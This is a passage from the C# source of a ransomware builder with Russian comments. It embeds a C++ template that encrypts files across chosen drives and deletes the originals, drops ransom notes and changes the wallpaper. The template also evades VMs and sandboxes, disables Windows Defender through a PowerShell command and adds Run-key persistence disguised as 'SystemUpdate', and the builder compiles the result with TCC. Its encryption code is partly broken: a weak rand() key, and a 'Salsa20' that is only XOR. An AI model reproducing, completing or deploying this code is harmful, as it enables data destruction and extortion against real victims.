const char* g_NoteContent = ""{Escape(noteContent)}"";
const char* g_FakeName = ""{Escape(fakeName)}"";
const char* g_WallpaperBase64 = ""{Escape(wallpaperBase64)}"";
const char* g_WallpaperExt = ""{Escape(wallpaperExt)}"";
const int g_Algo = {algo};
const int g_FakeEnabled = {fakeEnabled};
const int g_HideEnabled = {hideEnabled};
const int g_AntiVM = {antiVM};
const int g_DisableDefender = {disableDefender};
const int g_Persistence = {persistence};
const int g_HideFiles = {hideFiles};
const int g_SandboxDelay = {sandboxDelay};

// ============================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================
std::vector<std::string> split_string(const std::string& str, char delimiter) {{
    std::vector<std::string> result;
    std::stringstream ss(str);
    std::string item;
    while (std::getline(ss, item, delimiter)) {{
        if (!item.empty()) result.push_back(item);
    }}
    return result;
}}

void to_lowercase(std::string& str) {{
    std::transform(str.begin(), str.end(), str.begin(), ::tolower);
}}

// ============================================================
// AES-256-CBC (Windows CryptoAPI)
// ============================================================
class AES_CBC {{
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    unsigned char key[32];
    unsigned char iv[16];
    
public:
    AES_CBC() : hProv(NULL), hKey(NULL) {{
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            return;
        }}
        
        srand(GetTickCount() ^ GetCurrentProcessId());
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 16; i++) iv[i] = rand() % 256;
        
        struct {{
            BLOBHEADER hdr;
            DWORD keySize;
            BYTE keyBytes[32];
        }} keyBlob;
        
        keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        keyBlob.hdr.reserved = 0;
        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
        keyBlob.keySize = 32;
        memcpy(keyBlob.keyBytes, key, 32);
        
        CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
        
        DWORD mode = CRYPT_MODE_CBC;
        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
        CryptSetKeyParam(hKey, KP_IV, iv, 0);
    }}
    
    ~AES_CBC() {{
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }}
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {{
        if (!hKey || input.empty()) return false;
        
        DWORD dataLen = input.size();
        DWORD encLen = dataLen + 16;
        
        output.resize(encLen + 16);
        memcpy(output.data(), iv, 16);
        memcpy(output.data() + 16, input.data(), dataLen);
        
        DWORD outLen = dataLen;
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data() + 16, &outLen, encLen)) {{
            return false;
        }}
        
        output.resize(outLen + 16);
        return true;
    }}
}};

// ============================================================
// SALSA20
// ============================================================
class Salsa20 {{
private:
    unsigned char key[32];
    unsigned char nonce[8];
    
public:
    Salsa20() {{
        srand(GetTickCount() ^ GetCurrentProcessId());
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
    }}
    
    void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {{
        output.resize(input.size() + 8);
        memcpy(output.data(), nonce, 8);
        
        for (size_t i = 0; i < input.size(); i++) {{
            output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
        }}
    }}
}};

// ============================================================
// RSA
// ============================================================
class RSA_Encrypt {{
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    
public:
    RSA_Encrypt() : hProv(NULL), hKey(NULL) {{
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {{
            return;
        }}
        CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
    }}
    
    ~RSA_Encrypt() {{
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }}
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {{
        if (!hKey || input.empty()) return false;
        
        DWORD encLen = 0;
        DWORD dataLen = input.size();
        CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
        encLen = dataLen;
        
        output.resize(encLen);
        memcpy(output.data(), input.data(), input.size());
        
        DWORD outLen = input.size();
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data(), &outLen, encLen)) {{
            return false;
        }}
        return true;
    }}
}};

// ============================================================
// УСТАНОВКА ОБОЕВ ИЗ BASE64
// ============================================================
void set_wallpaper(const std::string& base64_data, const std::string& ext) {{
    if (base64_data.empty()) return;
    
    DWORD size = 0;
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
    if (size == 0) return;
    
    std::vector<BYTE> data(size);
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
    
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    std::string wall_path = std::string(temp_path) + ""wall"" + ext;
    
    std::ofstream out(wall_path, std::ios::binary);
    out.write((char*)data.data(), data.size());
    out.close();
    
    if (GetFileAttributesA(wall_path.c_str()) == INVALID_FILE_ATTRIBUTES) {{
        return;
    }}
    
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}}

// ============================================================
// ПЕРСИСТЕНТНОСТЬ
// ============================================================
void add_persistence() {{
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, ""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
        RegSetValueExA(hKey, ""SystemUpdate"", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }}
}}

// ============================================================
// СКРЫТИЕ ФАЙЛОВ
// ============================================================
void hide_files(const std::string& ext) {{
    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    
    for (char* d = drives; *d; d += strlen(d) + 1) {{
        std::string drive = d;
        try {{
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {{
                if (entry.is_regular_file()) {{
                    std::string path = entry.path().string();
                    if (path.length() >= ext.length() && path.substr(path.length() - ext.length()) == ext) {{
                        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
                    }}
                }}
            }}
        }} catch (...) {{}}
    }}
}}

// ============================================================
// ОБНАРУЖЕНИЕ VM
// ============================================================
bool detect_vm() {{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {{
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {{
            do {{
                std::string name = pe.szExeFile;
                to_lowercase(name);
                if (name.find(""vbox"") != std::string::npos ||
                    name.find(""vmware"") != std::string::npos ||
                    name.find(""virtual"") != std::string::npos ||
                    name.find(""qemu"") != std::string::npos) {{
                    CloseHandle(snap);
                    return true;
                }}
            }} while (Process32Next(snap, &pe));
        }}
        CloseHandle(snap);
    }}
    return false;
}}

// ============================================================
// ОТКЛЮЧЕНИЕ DEFENDER
// ============================================================
void disable_defender() {{
    system(""powershell -Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
}}

// ============================================================
// МАСКИРОВКА ПРОЦЕССА
// ============================================================
void fake_process_name() {{
    SetConsoleTitleA(g_FakeName);
}}

// ============================================================
// СКРЫТИЕ ПРОЦЕССА
// ============================================================
void hide_process() {{
    try {{
        SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
    }} catch (...) {{}}
}}

// ============================================================
// ШИФРОВАНИЕ ФАЙЛА
// ============================================================
void encrypt_file(const std::string& path, const std::string& ext, int algo) {{
    try {{
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {{}});
        in.close();
        
        if (data.empty()) return;
        
        std::vector<BYTE> encrypted;
        bool success = false;
        
        switch (algo) {{
            case 0: {{
                AES_CBC aes;
                success = aes.Encrypt(data, encrypted);
                break;
            }}
            case 1: {{
                Salsa20 salsa;
                salsa.Encrypt(data, encrypted);
                success = true;
                break;
            }}
            case 2: {{
                RSA_Encrypt rsa;
                success = rsa.Encrypt(data, encrypted);
                break;
            }}
            default: return;
        }}
        
        if (!success || encrypted.empty()) return;
        
        std::string out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileA(path.c_str());
    }} catch (...) {{}}
}}

// ============================================================
// ОБХОД И ШИФРОВАНИЕ
// ============================================================
void walk_and_encrypt(const std::string& start_path,
                      const std::vector<std::string>& extensions,
                      const std::vector<std::string>& exclude_folders,
                      const std::string& encrypted_ext,
                      int algo) {{
    try {{
        for (auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {{
            if (entry.is_directory()) continue;
            
            std::string full_path = entry.path().string();
            bool excluded = false;
            for (const auto& ex : exclude_folders) {{
                if (full_path.find(ex) == 0) {{
                    excluded = true;
                    break;
                }}
            }}
            if (excluded) continue;
            
            std::string ext = entry.path().extension().string();
            to_lowercase(ext);
            if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {{
                encrypt_file(full_path, encrypted_ext, algo);
            }}
        }}
    }} catch (...) {{}}
}}

// ============================================================
// РАЗМЕЩЕНИЕ ЗАПИСОК
// ============================================================
void drop_notes(const std::vector<std::string>& drives,
                const std::vector<std::string>& exclude_folders,
                const std::string& note_name,
                const std::string& note_content) {{
    for (const auto& drive : drives) {{
        try {{
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {{
                if (entry.is_directory()) {{
                    std::string note_path = entry.path().string() + ""\\"" + note_name;
                    
                    bool excluded = false;
                    for (const auto& ex : exclude_folders) {{
                        if (entry.path().string().find(ex) == 0) {{
                            excluded = true;
                            break;
                        }}
                    }}
                    if (excluded) continue;
                    
                    if (!std::filesystem::exists(note_path)) {{
                        std::ofstream out(note_path);
                        out << note_content;
                        out.close();
                    }}
                }}
            }}
        }} catch (...) {{}}
    }}
}}

// ============================================================
// ГЛАВНАЯ ФУНКЦИЯ
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    srand(GetTickCount() ^ GetCurrentProcessId());
    
    int algo = g_Algo;
    
    if (g_AntiVM && detect_vm()) return 0;
    if (g_FakeEnabled) fake_process_name();
    if (g_HideEnabled) hide_process();
    if (g_DisableDefender) disable_defender();
    if (g_Persistence) add_persistence();
    if (g_SandboxDelay) Sleep(60000);
    
    std::string drives_str = g_Drives;
    std::string exts_str = g_Exts;
    std::string exclude_str = g_Exclude;
    std::string include_str = g_Include;
    std::string encrypted_ext = g_EncryptedExt;
    
    auto drives = split_string(drives_str, '|');
    auto extensions = split_string(exts_str, '|');
    auto exclude_folders = split_string(exclude_str, '|');
    auto include_folders = split_string(include_str, '|');
    
    std::vector<std::string> targets = drives;
    if (!include_folders.empty() && !(include_folders.size() == 1 && include_folders[0].empty())) {{
        targets = include_folders;
    }}
    
    std::vector<std::thread> threads;
    for (const auto& target : targets) {{
        threads.emplace_back(walk_and_encrypt, target, std::ref(extensions),
                           std::ref(exclude_folders), std::ref(encrypted_ext), algo);
    }}
    for (auto& t : threads) t.join();
    
    if (g_HideFiles) hide_files(encrypted_ext);
    
    std::string note_name = g_NoteName;
    std::string note_content = g_NoteContent;
    drop_notes(drives, exclude_folders, note_name, note_content);
    
    std::string wall_base64 = g_WallpaperBase64;
    std::string wall_ext = g_WallpaperExt;
    set_wallpaper(wall_base64, wall_ext);
    
    return 0;
}}
";
        }
        
        // ============================================================
        // ОСНОВНАЯ ЛОГИКА СБОРКИ
        // ============================================================
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                lblStatus.Text = "STARTING BUILD...";
                lblStatus.ForeColor = yellowColor;
                progressBar.Visible = true;
                btnBuild.Enabled = false;
                
                // Сбор параметров
                string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256";
                int algoValue = algorithm == "AES-256" ? 0 : algorithm == "Salsa20" ? 1 : 2;
                
                List<string> selectedDrives = new List<string>();
                if (chkC.Checked) selectedDrives.Add("C:\\");
                if (chkD.Checked) selectedDrives.Add("D:\\");
                if (chkE.Checked) selectedDrives.Add("E:\\");
                if (chkZ.Checked) selectedDrives.Add("Z:\\");
                
                if (selectedDrives.Count == 0)
                {
                    MessageBox.Show("Select at least one drive!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnBuild.Enabled = true;
                    progressBar.Visible = false;
                    lblStatus.Text = "ERROR: select drive";
                    lblStatus.ForeColor = errorColor;
                    return;
                }
                
                List<string> selectedExts = GetSelectedExtensions();
                string encryptedExt = txtEncryptedExt.Text;
                string noteName = txtNoteName.Text;
                string noteContent = txtNoteContent.Text;
                string outputName = txtOutputName.Text;
                string outputPath = txtOutputPath.Text;
                
                // WALLPAPER
                string wallpaperBase64 = "";
                string wallpaperExt = ".jpg";
                if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
                {
                    byte[] imageData = File.ReadAllBytes(wallpaperPath);
                    wallpaperExt = Path.GetExtension(wallpaperPath);
                    if (string.IsNullOrEmpty(wallpaperExt)) wallpaperExt = ".jpg";
                    wallpaperBase64 = Convert.ToBase64String(imageData);
                }
                
                lblDetail.Text = "Generating source code...";
                
                // Генерируем template.cpp
                string templateCode = GenerateTemplateCode(
                    string.Join("|", selectedDrives),
                    string.Join("|", selectedExts),
                    txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"),
                    txtIncludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"),
                    encryptedExt,
                    noteName,
                    noteContent,
                    txtFakeProcessName.Text,
                    algoValue,
                    chkFakeProcess.Checked ? 1 : 0,
                    chkHideProcess.Checked ? 1 : 0,
                    chkAntiVM.Checked ? 1 : 0,
                    chkDisableDefender.Checked ? 1 : 0,
                    chkAddPersistence.Checked ? 1 : 0,
                    chkHideFilesAttr.Checked ? 1 : 0,
                    chkSandboxDelay.Checked ? 1 : 0,
                    wallpaperBase64,
                    wallpaperExt
                );
                
                // Сохраняем template.cpp во временную папку
                string tempDir = Path.Combine(Path.GetTempPath(), "ARES7Build");
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
                
                string cppPath = Path.Combine(tempDir, "template.cpp");
                File.WriteAllText(cppPath, templateCode, Encoding.UTF8);
                
                lblDetail.Text = "Extracting TCC compiler...";
                
                // Получаем TCC
                byte[] tccData;
                string tccPath = Path.Combine(tempDir, "tcc.exe");
                
                // Пробуем загрузить из ресурсов
                using (var stream = GetType().Assembly.GetManifestResourceStream("RansomwareBuilder.tcc.exe"))
                {
                    if (stream != null)
                    {
                        tccData = new byte[stream.Length];
                        stream.Read(tccData, 0, tccData.Length);
                        File.WriteAllBytes(tccPath, tccData);
                    }
                    else
                    {
                        // Скачиваем TCC
                        using (var client = new System.Net.WebClient())
                        {
                            tccData = client.DownloadData("https://github.com/TinyCC/tinycc/raw/master/tcc.exe");
                            File.WriteAllBytes(tccPath, tccData);
                        }
                    }
                }
                
                lblDetail.Text = "Compiling with TCC...";
                
                // Компилируем
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = tccPath;
                psi.Arguments = $"-o \"{outputName}\" -luser32 -ladvapi32 -lshell32 -lcrypt32 -lws2_32 \"{cppPath}\"";
                psi.WorkingDirectory = outputPath;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;
                
                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                
                // Проверяем результат
                string finalPath = Path.Combine(outputPath, outputName);
                if (File.Exists(finalPath) && new FileInfo(finalPath).Length > 50000)
                {
                    lblStatus.Text = "SUCCESS!";
                    lblStatus.ForeColor = successColor;
                    long sizeKB = new FileInfo(finalPath).Length / 1024;
                    lblDetail.Text = $"{finalPath} | Size: {sizeKB} KB";
                    
                    if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                    {
                        string destIcon = Path.Combine(outputPath, Path.GetFileName(iconPath));
                        if (File.Exists(destIcon)) File.Delete(destIcon);
                        File.Copy(iconPath, destIcon, true);
                    }
                    
                    MessageBox.Show($"File compiled successfully!\n\n{finalPath}\n\nSize: {sizeKB} KB", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    string errorMsg = "Compilation failed!\n\n" + error + "\n" + output;
                    MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    lblStatus.Text = "ERROR: compilation failed";
                    lblStatus.ForeColor = errorColor;
                    lblDetail.Text = "Check output for details";
                }
                
                // Очищаем временные файлы (кроме EXE)
                try { File.Delete(cppPath); } catch { }
                try { File.Delete(tccPath); } catch { }
                
            }
            catch (Exception ex)
            {
                lblStatus.Text = "ERROR!";
                lblStatus.ForeColor = errorColor;
                lblDetail.Text = ex.Message;
                MessageBox.Show($"Error: {ex.Message}\n\n{ex.StackTrace}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                btnBuild.Enabled = true;
                progressBar.Visible = false;
            }
        }
    }
}